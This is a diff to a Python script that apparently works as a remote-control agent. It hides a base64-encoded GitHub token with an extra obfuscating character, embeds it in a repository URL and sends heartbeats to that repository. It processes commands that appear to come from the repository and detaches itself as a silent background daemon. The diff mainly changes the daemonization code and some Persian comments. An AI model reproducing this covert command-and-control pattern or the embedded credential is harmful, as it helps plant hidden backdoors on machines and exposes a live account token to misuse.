@@ -21,7 +21,7 @@ TOKEN_B64 = "Z2hwX1R5SmJqNENEU2FSTGtQejlxU09ab3Z0eDljbURteDREQ3hMVw==2"
 GITHUB_TOKEN = base64.b64decode(TOKEN_B64[:-1]).decode('utf-8')
 REPO_URL = REPO_URL_BASE.replace("https://", f"https://{GITHUB_TOKEN}@")
 
-CHECK_INTERVAL = 10  # هر ۱۰ ثانیه یکبار چک کن
+CHECK_INTERVAL = 10
 # ==============================
 
 def run_cmd(cmd, cwd=None):
@@ -66,7 +66,7 @@ def update_online_txt():
     online_path = Path(REPO_DIR) / "online.txt"
     name = "linuxarvin"
     uptime = get_uptime()
-    last_update = int(time.time())  # زمان یونیکس فعلی
+    last_update = int(time.time())
     content = f"names={name}\nuptime={uptime}\nlast_update={last_update}\n"
     with open(online_path, "w") as f:
         f.write(content)
@@ -113,16 +113,15 @@ def process_commands():
     return com_value
 
 def daemonize():
+    """تبدیل به دیمون با redirect کردن stdها به /dev/null"""
     if os.fork() > 0:
         sys.exit(0)
     os.setsid()
     if os.fork() > 0:
         sys.exit(0)
-    sys.stdout.close()
-    sys.stderr.close()
-    sys.stdin.close()
     os.chdir("/")
-    with open('/dev/null', 'w') as f:
+    with open('/dev/null', 'r+') as f:
+        os.dup2(f.fileno(), sys.stdin.fileno())
         os.dup2(f.fileno(), sys.stdout.fileno())
         os.dup2(f.fileno(), sys.stderr.fileno())
 
@@ -158,7 +157,6 @@ def main_loop():
             time.sleep(CHECK_INTERVAL)
 
 if __name__ == "__main__":
-    if os.fork() > 0:
-        sys.exit(0)
+    # تبدیل به دیمون
     daemonize()
     main_loop()
